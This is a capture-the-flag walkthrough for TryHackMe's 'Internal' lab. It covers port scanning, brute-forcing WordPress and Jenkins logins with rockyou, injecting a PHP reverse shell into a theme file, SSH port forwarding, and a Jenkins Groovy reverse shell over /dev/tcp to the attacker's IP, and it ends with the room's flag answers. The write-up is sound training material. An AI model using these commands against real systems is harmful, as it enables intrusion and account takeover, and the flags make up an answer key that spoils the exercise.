
# Internal CTF Walkthrough

Internal is a vulnerable server on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/Internal<br />
THM Difficulty: Hard<br />
My Difficulty: TBA<br />
Target IP: 10.10.44.166<br />
AttackBox IP: 10.10.153.77<br />
</i>

# Enumeration

Before anything we'll need to add internal.thm to our hosts file as stated in the briefing. Let's do that now. <br />
```shell
pluma /etc/hosts
```
Now let's add the box, and save the file. I'll show a screenshot of my settings below.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT1.png?raw=true)<br />

Now that's out of the way, let's get started. We will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```shell
rustscan -a 10.10.44.166
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT2.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flags -sV to find the service versions on the open ports and -sC to run the default Nmap scripts against the target.<br />
```shell
nmap -sV -sC -p22,80 10.10.44.166
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT3.png?raw=true)<br />
Only two services, SSH and HTTP.


## HTTP Service Enumeration

Let's head over to the website and see what we can do there. <br />
```shell
http://10.10.44.166/
```
Hmm... The default Apache2 page. Let's see if we can find any other directories.

### Looking for directories with Gobuster

Let's open up Gobuster and start looking for other directories. <br />
```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.44.166/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT4.png?raw=true)<br />
Okay we found a few more directories, let's have a look and see what we have.

## Using WPScan

After navigating to the directory ```/blog``` I can see that it's a wordpress site, let's use WPscan to find out more information.
```shell
wpscan --url http://10.10.44.166/blog -e u
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT5.png?raw=true)<br />
Okay this scan revealed a lot, I checked the readme page it found and I now have the wordpress login page. I also found out the username is admin... Maybe I could bruteforce the account?<br />

### Bruteforcing with WPScan

Let's try bruteforcing the login with WPscan, we know the username is ```admin```.<br />
```shell
wpscan --url http://10.10.44.166/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```
After a little time we found the correct password! Let's login and see what we can do. <br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT6.png?raw=true)<br />


### Looking around the admin dashboard

After looking around for a while and looking for ways to upload shells, I switched the theme to "Twenty Nineteen" and found this post:<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT10.png?raw=true)<br />
Let's keep this to the side for now, I tried the credentials on the phpmyadmin page that was found earlier and SSH but no luck.<br />
<br />


## Uploading a reverse shell

After changing to the last theme "Twenty Twenty" I couldn't find any more information, so I decided to try uploading a shell. AttackBoxes on THM come with shells already installed. Let's edit and upload one. <br />
```shell
mv /usr/share/webshells/php/php-reverse-shell.php shell.php
```
This will copy the shell from it's original directory and paste it with the name shell.php in your home directory. ```/root``` if you're using AttackBox.<br />
```shell
pluma shell.php
```
All we need to do is change the ```$ip``` and ```$port``` as I've done below<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT7.png?raw=true)<br />
Now let's get it uploaded! I doubt we will be able to upload this shell so we're going to edit a theme page with the .php files contents. On the left side of the screen there will be a paintbrush icon we'll go to that and then Theme Editor.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT8.png?raw=true)<br />
Now on the right side of the page select the ```index.php```. Open up shell.php and copy all of its contents, head back to your web browser and replace all of the content with your shells code then click the blue Update File button.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT11.png?raw=true)<br />
Before opening the page and executing our shell, let's start our listener on AttackBox with netcat.<br />
```shell
nc -lvnp 8888
```
We're now ready to execute our PHP reverse shell. <br />
```shell
http://10.10.44.166/blog/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT12.png?raw=true)<br />
Success! Let's make our shell more stable by using Python.
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT13.png?raw=true)<br />
Great, let's have a look around the system for the user flag. <br />

## System Enumeration

After looking around for a long time without luck I finally found something interesting looking through all of the text files...<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT14.png?raw=true)<br />
Some details for another user! Let's get on that account and try to escalate our privileges further.<br />
```shell
su aubreanna
```
Awesome! Let's get the user flag and then find a way to get the root flag!<br />
```shell
cd /home/aubreanna
cat user.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT15.png?raw=true)<br />

There was another interesting file in aubreannas home folder, let's have a look at it. <br />
```
cat jenkins.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT16.png?raw=true)<br />
There's an internal Jenkins server running, let's use our AttackBox machine and use SSH to forward Jenkins IP:Port to our AttackBox.<br />
```shell
ssh -L 9999:172.17.0.2:8080 aubreanna@internal.thm
```
Now let's head over to our web browser and visit the following URL<br />
```shell
http://localhost:9999/
```
After trying all of the logins I had gathered, nothing worked so I decided to try bruteforcing the login.<br />


## Bruteforcing Login

First we'll need to capture the request of the login with Burp Suite. <br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT16.png?raw=true)<br />
Now let's fire up hydra and try bruteforcing the password for the admin account.<br />
```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9999 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
```
After a little while, we finally crack the password! Let's use it to login.<br />
<br />

## Getting a remote shell on Jenkins.

Select "Manage Jenkins" on the left of the webpage. Scroll down until you find "Script Console"
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT27.png?raw=true)<br />
Now we need to add the commands we want it to execute, let's create a reverse shell. Paste the code below into the command textbox and then click the blue button "Run"<br />
```shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.153.77/9500;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT28.png?raw=true)<br />
Before executing the commands, we need to set up a listener on our AttackBox.<br />
```shell
rlwrap nc -nlvp 9500
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT23.png?raw=true)<br />
Okay now we're all setup let's run it, click the blue "Run" button.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT29.png?raw=true)<br />
Success! Let's have a look around and see if we can find the root flag.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT30.png?raw=true)<br />
Permission denied still... Damn let's look for another way around it. While checking ways to escalate my privileges I thought I'd check the ```/opt``` directory in-case there's credentials inside the folder again.<br />
```
cd /opt
ls
cat note.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT31.png?raw=true)<br />
Root access! Let's get that root flag.<br />
<br />

Now that we have the root login, let's go back to our other reverse shell that we had open on the user aubreanna and try the root credentials. <br />
```shell
su root
cd /root
ls
cat root.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT32.png?raw=true)<br />
Finally! This one took me a while, I didn't include a lot of the enumeration and all the ways I tried to escalate my privileges so it took me a lot longer than it looks.

## Questions & Answers

Question 1:<br />
**What is the user flag?** THM{int3rna1_fl4g_1}<br />

Question 2:<br />
**What is the root flag?** THM{d0ck3r_d3str0y3r}<br />

### Farewell, I hope you all enjoyed this write-up!

